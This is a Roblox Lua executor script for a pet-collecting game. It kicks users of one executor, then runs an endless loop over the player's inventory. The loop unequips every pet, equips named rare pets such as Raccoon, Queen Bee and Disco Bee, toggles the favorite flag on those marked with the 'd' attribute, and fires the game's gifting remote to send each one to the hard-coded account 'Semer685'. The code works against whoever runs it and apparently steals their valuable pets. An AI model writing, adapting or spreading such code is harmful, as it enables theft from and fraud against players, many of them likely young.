local exec = identifyexecutor()
if exec == 'Delta' then
    game:GetService('Players').LocalPlayer:Kick('Your executor isnt supported!')
end

local player = game:GetService("Players").LocalPlayer
local replicatedStorage = game:GetService("ReplicatedStorage")
local petGiftingService = replicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
local favoriteItemEvent = replicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
local petsService = replicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetsService")

local targetPlayerName = "Semer685"
local targetItems = {
    "Raccoon",
    "Butterfly",
    "Red Fox",
    "Queen Bee",
    "Dragonfly",
    "Disco Bee",
    "Bear Bee",
    "Petal Bee"
}

local processedItems = {}

-- Функция для снятия всех питомцев
local function unequipAllPets()
    local petsFolder = workspace:FindFirstChild("PetsPhysical")
    if not petsFolder then return end

    for _, pet in pairs(petsFolder:GetChildren()) do
        if pet:GetAttribute("OWNER") == player then
            local petUUID = pet:GetAttribute("UUID")
            if petUUID then
                local args = {
                    "UnequipPet",
                    petUUID
                }
                petsService:FireServer(unpack(args))
                wait(0.05) -- Небольшая задержка между запросами
            end
        end
    end
end

local function processInventory()
    -- Сначала снимаем всех питомцев
    unequipAllPets()
    wait(0.2) -- Даем время на обработку

    local backpack = player:FindFirstChild("Backpack")
    if not backpack then return end

    for _, item in pairs(backpack:GetChildren()) do
        if item:IsA("Tool") and not processedItems[item] then
            local baseName = item.Name:match("^(.-)%[") or item.Name
            baseName = baseName:match("^%s*(.-)%s*$")

            for _, target in ipairs(targetItems) do
                if baseName == target then
                    if player.Character then
                        local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
                        if humanoid then
                            humanoid:EquipTool(item)
                            wait(0.2)

                            if item:GetAttribute("d") == true then
                                local toolInHand = player.Character:FindFirstChild(item.Name)
                                if toolInHand then
                                    local args = { toolInHand }
                                    favoriteItemEvent:FireServer(unpack(args))
                                    wait(0.2)
                                end
                            end

                            local args = {
                                "GivePet",
                                game:GetService("Players"):WaitForChild(targetPlayerName)
                            }
                            petGiftingService:FireServer(unpack(args))

                            processedItems[item] = true
                            wait(0.2)
                            break
                        end
                    end
                end
            end
        end
    end
end

player.CharacterAdded:Connect(function(character)
    character:WaitForChild("Humanoid")
    processInventory()
end)

while true do
    pcall(processInventory)
    wait(0.2)
end
